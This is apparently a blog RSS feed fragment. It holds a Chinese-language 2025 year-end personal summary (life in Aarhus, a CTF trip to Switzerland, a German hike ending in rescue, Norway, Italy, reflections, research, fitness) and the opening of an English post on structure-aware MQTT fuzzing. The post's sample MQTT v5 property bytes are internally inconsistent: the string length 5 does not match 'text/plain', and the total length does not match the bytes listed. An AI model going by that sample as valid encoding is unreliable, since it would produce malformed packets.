-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;刚来到丹麦，感觉一切都很新奇，见到什么都想记录下来。&lt;/p&gt;
-&lt;p&gt;总之奥胡斯是一座很小很宁静很温馨的城市。&lt;/p&gt;
-&lt;p&gt;在这里，你可以心平气和的做你一切想做的事。&lt;/p&gt;
-&lt;p&gt;5335，这栋楼就是我几乎每天待的地方。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9361766314349_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;160&#34; &gt;
-&lt;p&gt;下面这个是我认为一个很美的路口，当列车驶过，有种浪漫的感觉。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/20251221115249.png&#34; alt=&#34;描述&#34; width=&#34;320&#34; &gt;
-&lt;p&gt;在公寓楼顶拍摄的夜景。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9401766315154_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;320&#34; &gt;
-&lt;p&gt;下面是海边的夜景，真美啊。
-&lt;img src=&#34;https://BestRun.github.io/pictures/9411766315375_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;200&#34; &gt;&lt;/p&gt;
-&lt;h3 id=&#34;瑞士&#34; &gt;瑞士
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%91%9e%e5%a3%ab&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;去瑞士是为了参加ctf比赛，虽然已经很久不打比赛，但是感觉瑞士之旅还是很完美的。&lt;/p&gt;
-&lt;p&gt;去参观了一下EPFL，海边也是美得让人心醉。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9431766315810_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;
-&lt;p&gt;比赛现场。&lt;/p&gt;
-&lt;p&gt;大家喝了很多红牛，从下午6点干到第二天早上6点。&lt;/p&gt;
-&lt;p&gt;也算是一段难忘的回忆了。
-&lt;img src=&#34;https://BestRun.github.io/pictures/9451766316072_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;&lt;/p&gt;
-&lt;h3 id=&#34;德国之旅一&#34; &gt;德国之旅（一）
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%be%b7%e5%9b%bd%e4%b9%8b%e6%97%85%e4%b8%80&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;在瑞士比赛之后，一名德国队友开车把我们捎到了德国。&lt;/p&gt;
-&lt;p&gt;我们便开始了为期一周的徒步。&lt;/p&gt;
-&lt;p&gt;巴登-巴登小镇徒步。
-&lt;img src=&#34;https://BestRun.github.io/pictures/9461766316267_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;&lt;/p&gt;
-&lt;p&gt;慕尼黑广场。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9471766316276_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;
-&lt;p&gt;一直没敢跟我父母说，我们俩人挑战hard的徒步路线，没有别的装备。&lt;/p&gt;
-&lt;p&gt;凭着冲锋衣和登山鞋挑战天鹅堡后的雪山。 （后来才知道那条路因为危险被封了，不应该行人能走的&amp;hellip;&lt;/p&gt;
-&lt;p&gt;到山顶，天快要黑了，手机也快没电了&amp;hellip;&lt;/p&gt;
-&lt;p&gt;我们才发现下不去了&amp;hellip;&lt;/p&gt;
-&lt;p&gt;最后6格电拨打求救电话，他们问我们要不要呼叫helicopter&amp;hellip;&lt;/p&gt;
-&lt;p&gt;最后联系到了索道的工作人员，为我们俩单独开了索道。于是我们坐着独享的索道，最后一人被救援队收了250欧.&lt;/p&gt;
-&lt;p&gt;但是拍到了如下的风景，这个风景，应该是永远不会有人在夜幕降临时拍到了。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9481766316286_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;
-&lt;p&gt;也就是那次后，我爱上了拼色的冲锋衣，因为救援人员穿的是拼色的。&lt;/p&gt;
-&lt;p&gt;我就觉得拼色的冲锋衣很专业&amp;hellip;&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9491766316734_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;
-&lt;h3 id=&#34;德国之旅二&#34; &gt;德国之旅（二）
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%be%b7%e5%9b%bd%e4%b9%8b%e6%97%85%e4%ba%8c&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;这里就简单扔一个朋友圈。&lt;/p&gt;
-&lt;p&gt;去了CISPA研究所参加了一周的可信AI workshop， 遇到了很多志同道合的朋友～&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/cispa.png&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;
-&lt;h3 id=&#34;挪威&#34; &gt;挪威
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%8c%aa%e5%a8%81&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;挪威之旅，可以说是我今年最难忘的经历。&lt;/p&gt;
-&lt;p&gt;如果说我今年的人生照片是哪张，我想说是绝对是在恶魔之舌的这张！&lt;/p&gt;
-&lt;p&gt;这里直接来张截图了.&lt;/p&gt;
-&lt;p&gt;现在回想起来真的很不容易，真是一段难忘的经历啊。&lt;/p&gt;
-&lt;p&gt;很享受那种，在大自然下洗涤灵魂的感觉。&lt;/p&gt;
-&lt;p&gt;这才是我想要的自由啊。&lt;/p&gt;
-&lt;p&gt;欲买桂花同载酒，终不似少年游。&lt;/p&gt;
-&lt;p&gt;我还是想在年轻的时候看更多的风景， 行更多的路。&lt;/p&gt;
-&lt;p&gt;人生不过三万天，一定要去做自己想做的事。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/nuowei.png&#34; alt=&#34;描述&#34; width=&#34;400&#34; &gt;
-&lt;h3 id=&#34;意大利&#34; &gt;意大利
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%84%8f%e5%a4%a7%e5%88%a9&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;意大利之旅可以说是十分的特种兵了。&lt;/p&gt;
-&lt;p&gt;6天7城：&lt;/p&gt;
-&lt;p&gt;奥胡斯 - 哥哈 - 米兰 - 撒丁岛（卡利亚里） - 罗马/梵蒂冈 - 佛罗伦萨 - 比萨 - 哥哈 - 奥胡斯&lt;/p&gt;
-&lt;p&gt;在意大利吃的每顿饭都好吃！&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/milan.png&#34; alt=&#34;描述&#34; width=&#34;300&#34; &gt;
-&lt;h2 id=&#34;人生感悟&#34; &gt;人生感悟
-&lt;span&gt;
-    &lt;a href=&#34;#%e4%ba%ba%e7%94%9f%e6%84%9f%e6%82%9f&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;h3 id=&#34;遗憾&#34; &gt;遗憾
-&lt;span&gt;
-    &lt;a href=&#34;#%e9%81%97%e6%86%be&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;想要谈一谈遗憾。&lt;/p&gt;
-&lt;p&gt;什么是遗憾？失败算不算遗憾，分别算不算遗憾，旅游摄影时错过一瞬间最美的画面算不算遗憾。&lt;/p&gt;
-&lt;p&gt;今年在挪威旅游时，在海面上看到了了一艘红色的船。&lt;/p&gt;
-&lt;p&gt;我们当时在开车，是一段环山公路，我犹豫了一下，没有立刻拍照，却发现，再没能见到那艘船了。&lt;/p&gt;
-&lt;p&gt;过了好很久，我脑海里一直在想这艘船。&lt;/p&gt;
-&lt;p&gt;越想越感到遗憾。&lt;/p&gt;
-&lt;p&gt;如果我当时按下快门，是不是就能拍的到。&lt;/p&gt;
-&lt;p&gt;人生又何尝不是这样。&lt;/p&gt;
-&lt;p&gt;我觉得需要豁达的心态，但也正是因为遗憾，那个最美的画面才会一直留在心中，不是吗？&lt;/p&gt;
-&lt;h3 id=&#34;离别&#34; &gt;离别
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%a6%bb%e5%88%ab&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;今年也遇到了很多的离别，出国要和很多朋友离别。&lt;/p&gt;
-&lt;p&gt;上学期和很多交换生朋友离别。&lt;/p&gt;
-&lt;p&gt;下学期，我要去交换，又要和很多朋友离别，等我再回到丹麦，也许大部分朋友已经各奔东西了。&lt;/p&gt;
-&lt;p&gt;遗憾和离别总是贯穿人生始终。&lt;/p&gt;
-&lt;p&gt;人生世事无常，多得是离别，此后， 你我隔山隔水，南北东西。&lt;/p&gt;
-&lt;p&gt;如果再也见不到，我也想祝福大家都能一直幸福。&lt;/p&gt;
-&lt;h3 id=&#34;少年心气&#34; &gt;少年心气
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%b0%91%e5%b9%b4%e5%bf%83%e6%b0%94&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;到了今年，我还是爱看少年歌行这类的作品。&lt;/p&gt;
-&lt;p&gt;少年心气是不可再生之物。&lt;/p&gt;
-&lt;p&gt;我喜欢不良人中的李星云，也喜欢少年歌行里的少年们。&lt;/p&gt;
-&lt;p&gt;曾经的我以为我可以凭努力获得一切，但现在却对一些事有了更现实的考量。&lt;/p&gt;
-&lt;p&gt;但还是希望，能保留着一份少年心气，凭心而动。只是肩上，似乎多了一份责任。&lt;/p&gt;
-&lt;p&gt;希望，在经历所谓的成长之后，仍能鲜衣怒马。&lt;/p&gt;
-&lt;h3 id=&#34;随机问题&#34; &gt;随机问题
-&lt;span&gt;
-    &lt;a href=&#34;#%e9%9a%8f%e6%9c%ba%e9%97%ae%e9%a2%98&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;Q: 用三个词形容2025&lt;/p&gt;
-&lt;p&gt;A: 体验，成长，失败&lt;/p&gt;
-&lt;p&gt;Q: 让你觉得“还好我做了”是哪件事？&lt;/p&gt;
-&lt;p&gt;A: 去挪威旅游&lt;/p&gt;
-&lt;h2 id=&#34;工作&#34; &gt;工作
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%b7%a5%e4%bd%9c&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;h3 id=&#34;科研&#34; &gt;科研
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%a7%91%e7%a0%94&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;今年和很多人合作过。&lt;/p&gt;
-&lt;p&gt;但感觉受影响很大的是，遇到了我现在的的导师 &amp;ndash; Anders Moller。&lt;/p&gt;
-&lt;p&gt;他有种独特的魅力，就是我感觉我只要按照他说的去做就肯定会成功。&lt;/p&gt;
-&lt;p&gt;其次就是把复杂的事情拆解，一步一步实现的能力。&lt;/p&gt;
-&lt;p&gt;此外我也从远哥那里学到了很多东西。&lt;/p&gt;
-&lt;p&gt;其次就是也做了一些AI的东西，希望能发表吧。&lt;/p&gt;
-&lt;h2 id=&#34;生活&#34; &gt;生活
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%94%9f%e6%b4%bb&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;h3 id=&#34;健身&#34; &gt;健身
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%81%a5%e8%ba%ab&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;今年健身有大突破，感觉整个人蜕变了。&lt;/p&gt;
-&lt;p&gt;如今，健身已经成了我生活中的一部分。&lt;/p&gt;
-&lt;p&gt;当我看到年初的照片，我只想说： 那不是黑历史，那只是来时的路。&lt;/p&gt;
-&lt;p&gt;记录一下挥洒汗水的地方。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/9511766320931_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;200&#34; &gt;
-&lt;h2 id=&#34;未来规划&#34; &gt;未来规划
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%9c%aa%e6%9d%a5%e8%a7%84%e5%88%92&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;似乎现在是在AI的风口上。&lt;/p&gt;
-&lt;p&gt;迷茫，但又似乎又能抓住什么。&lt;/p&gt;
-&lt;p&gt;不想想太多，也不敢做太多承诺，让时间去见证吧。&lt;/p&gt;
-&lt;h2 id=&#34;参考文献&#34; &gt;参考文献
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%8c%ae&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://bestrun.github.io/life/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/&#34;&gt;2024年终总结&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://bestrun.github.io/life/2023_summary/&#34;&gt;2023年终总结&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Structure-Aware Fuzzing</title>
-      <link>https://BestRun.github.io/posts/structure-aware-fuzzing/</link>
-      <pubDate>Sun, 20 Apr 2025 19:49:50 +0200</pubDate>
-      
-      <guid>https://BestRun.github.io/posts/structure-aware-fuzzing/</guid>
-      <description>&lt;p&gt;Why I want to talk about the structure aware fuzzing today is because of a black hat video.
-&lt;a href=&#34;https://i.blackhat.com/USA-19/Wednesday/us-19-Metzman-Going-Beyond-Coverage-Guided-Fuzzing-With-Structured-Fuzzing.pdf&#34;&gt;https://i.blackhat.com/USA-19/Wednesday/us-19-Metzman-Going-Beyond-Coverage-Guided-Fuzzing-With-Structured-Fuzzing.pdf&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;what&amp;rsquo;s the difference between structure aware and grammar fuzzing?&lt;/p&gt;
-&lt;p&gt;Recently I am working on MQTT protocol fuzzing. But MQTT protocol has some special features.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/luisgar1990/MQTTGRAM&#34;&gt;https://github.com/luisgar1990/MQTTGRAM&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;mqtt-protocol&#34; &gt;MQTT Protocol
-&lt;span&gt;
-    &lt;a href=&#34;#mqtt-protocol&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;When I am fuzzing mqtt protocol, many testcases will be simplify rejected by the server for the reason:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;nni recv error!! Connection shudown&lt;/li&gt;
-&lt;li&gt;property_parse: Unknown type 7&lt;/li&gt;
-&lt;li&gt;UTF-8 check failed!&lt;/li&gt;
-&lt;li&gt;pipe id xxx is gone, pub failed&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Let&amp;rsquo;s see the description in the MQTT V5 specification:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;### 2.1.4 Remaining Length
-
-**Position:** starts at byte 2.
-
-The Remaining Length is a Variable Byte Integer that represents the number of bytes remaining within the current Control Packet, including data in the Variable Header and the Payload. The Remaining Length does not include the bytes used to encode the Remaining Length. The packet size is the total number of bytes in an MQTT Control Packet, this is equal to the length of the Fixed Header plus the Remaining Length.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&amp;rsquo;s a simplified valid MQTT v5 property sequence:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x0B   // Total properties length (var int)
-0x01   // Property ID: Payload Format Indicator
-0x00   // Value: 0 (binary data)
-0x03   // Property ID: Content Type
-0x00 0x05  // UTF-8 String Length (5)
-74 65 78 74 2F 70 6C 61 69 6E  // &amp;#34;text/plain&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So if we do mutation randomly, like bit flipping leads to an invalid input rejected by the target API in the early stage of parsing!&lt;/p&gt;
-&lt;p&gt;Grammar:&lt;/p&gt;
